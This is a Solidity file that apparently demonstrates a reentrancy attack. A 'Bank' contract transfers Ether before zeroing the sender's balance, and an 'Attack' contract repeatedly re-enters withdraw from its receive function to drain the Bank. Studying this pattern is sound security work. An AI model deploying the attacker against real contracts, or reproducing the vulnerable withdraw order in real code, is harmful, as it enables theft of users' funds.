// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Bank {
    event Withdraw(address indexed account, address indexed to, uint amount);
    mapping (address => uint) public balances;

    receive() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint amount = balances[msg.sender];
        require(amount > 0, "zero balance");

        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "unsuccess transfer");
        balances[msg.sender] = 0;

        emit Withdraw(msg.sender, msg.sender, amount);
    }
}

contract Attack {
    Bank bank;
    address private owner;

    constructor(Bank _bank) {
        owner = msg.sender;
        bank = _bank;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    function proxyBid() external payable {
        (bool success, ) = address(bank).call{value: 1 ether}("");
        require(success, "attack: unsuccess transfer");
    }

    function attack() external {
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance != 0 ether) {
            bank.withdraw();
        }
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

    function withdraw(address _to) external onlyOwner {
        payable(_to).transfer(address(this).balance);
    }
}